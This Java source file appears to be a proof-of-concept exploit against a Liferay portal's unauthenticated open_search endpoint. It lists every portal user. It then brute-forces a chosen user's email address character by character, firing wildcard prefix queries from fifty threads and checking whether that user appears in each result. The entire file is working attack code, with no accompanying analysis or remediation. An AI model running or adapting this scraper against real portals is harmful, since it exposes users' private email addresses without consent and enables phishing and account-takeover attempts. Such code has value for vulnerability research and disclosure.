package nl.orange11.liferay;

import com.sun.syndication.feed.synd.SyndEntry;
import com.sun.syndication.feed.synd.SyndFeed;
import com.sun.syndication.io.FeedException;
import com.sun.syndication.io.SyndFeedInput;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.GetMethod;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.lang.String.format;

public class Main {

    private static final Logger LOGGER = LoggerFactory.getLogger(Main.class);

    private static final Pattern TITLE_PATTERN = Pattern.compile("^Users and Organizations Â» (.*)$");
    private static final Pattern LINK_PATTERN = Pattern.compile(".*_125_p_u_i_d=(.*)$");

    private static final String LIFERAY_HOST = "localhost";
    private static final int LIFERAY_PORT = 8080;

    public static final int THREAD_POOL_SIZE = 50;

    public static void main(String... args) throws Exception {

        LOGGER.info("Fetching all users");

        List<User> users = fetchAllUsers();

        LOGGER.info("Users in the portal :");

        for (User user : users) {
            LOGGER.info(format("%d) %s", user.userId, user.fullname));
        }

        LOGGER.info("Enter the id of the user who's email you want to retrieve");


        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        String input;
        while (!isSelectableUserId(input = reader.readLine(), users)) {
            LOGGER.info("Not a valid selection");
        }

        long userId = Long.parseLong(input);

        LOGGER.info("Retrieving user email, this might take a while");
        String email = fetchUserEmail(userId);

        LOGGER.info("Found the email : " + email);

    }

    private static boolean isSelectableUserId(String input, List<User> users) {
        for (User user : users) {
            if (String.valueOf(user.userId).equals(input)) {
                return true;
            }
        }
        return false;
    }

    private static String fetchUserEmail(long userId) throws InterruptedException, ExecutionException {

        final ExecutorService executorPool = Executors.newFixedThreadPool(THREAD_POOL_SIZE);

        final CompletionService<String> completionService =
                new ExecutorCompletionService<String>(executorPool);

        CharacterGenerator characterGenerator = new CharacterGenerator();


        int taskCount = 0;
        String result = "";
        try {
            for (int i = 0; i < THREAD_POOL_SIZE; i++) {

                if (characterGenerator.hasNext()) {
                    String candidate = new StringBuilder(result)
                            .append(characterGenerator.next())
                            .toString();
                    completionService.submit(new MyCallable(candidate, userId));
                    taskCount++;
                }
            }

            while (true) {
                String taskResult = completionService.take().get();

                taskCount--;

                if (taskResult != null) {

                    LOGGER.debug("Got a new letter : " + taskResult);

                    result = taskResult;
                    characterGenerator.reset();
                }

                if (characterGenerator.hasNext()) {
                    String candidate = new StringBuilder(result)
                            .append(characterGenerator.next())
                            .toString();
                    completionService.submit(new MyCallable(candidate, userId));

                    taskCount++;
                }

                if (!characterGenerator.hasNext() && taskCount == 0) {
                    return result;
                }
            }
        } finally {
            executorPool.shutdown();
        }
    }


    private static class MyCallable implements Callable<String> {

        private final String emailAddressPart;
        private final long userId;

        private MyCallable(String emailAddressPart, long userId) {
            this.emailAddressPart = emailAddressPart;
            this.userId = userId;
        }

        @Override
        public String call() throws Exception {

            HttpClient client = new HttpClient();

            GetMethod method = new GetMethod(format("http://%s:%d/c/search/open_search" +
                    "?p=1&c=5000&keywords=emailAddress:%s*", LIFERAY_HOST, LIFERAY_PORT,
                    emailAddressPart));

            try {
                client.executeMethod(method);
                String response = method.getResponseBodyAsString();
                List<User> users = parseFeed(response);

                for (User user : users) {
                    if (user.userId == userId) {
                        return emailAddressPart;
                    }
                }
                return null;
            } finally {
                method.releaseConnection();
            }
        }
    }

    private static List<User> fetchAllUsers() throws IOException, FeedException {
        HttpClient client = new HttpClient();

        GetMethod method = new GetMethod(format("http://%s:%d/c/search/open_search" +
                "?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User", LIFERAY_HOST, LIFERAY_PORT));

        try {
            client.executeMethod(method);
            String response = method.getResponseBodyAsString();
            return parseFeed(response);
        } finally {
            method.releaseConnection();
        }
    }


    private static List<User> parseFeed(String xml) throws FeedException {

        SyndFeedInput input = new SyndFeedInput();

        SyndFeed feed = input.build(new StringReader(xml));

        @SuppressWarnings("unchecked")
        List<SyndEntry> entries = feed.getEntries();

        List<User> result = new ArrayList<User>(entries.size());

        for (SyndEntry entry : entries) {

            long userId = -1;

            String fullname = null;

            Matcher linkMatcher = LINK_PATTERN.matcher(entry.getLink());
            if (linkMatcher.matches()) {
                userId = Long.parseLong(linkMatcher.group(1));
            }

            Matcher titleMatcher = TITLE_PATTERN.matcher(entry.getTitle());
            if (titleMatcher.matches()) {
                fullname = titleMatcher.group(1);
            }

            result.add(new User(userId, fullname));
        }
        return result;
    }

    private static class User {
        public final long userId;
        public final String fullname;

        private User(long userId, String fullname) {
            this.userId = userId;
            this.fullname = fullname;
        }
    }

    private static class CharacterGenerator {

        private static final String CHARACTERS = "@abcdefghijklmnopqrstuvwxyz0123456789.";

        private int count = 0;

        public char next() {
            return CHARACTERS.charAt(count++);
        }

        public boolean hasNext() {
            return CHARACTERS.length() > count;
        }

        public void reset() {
            count = 0;
        }
    }
}
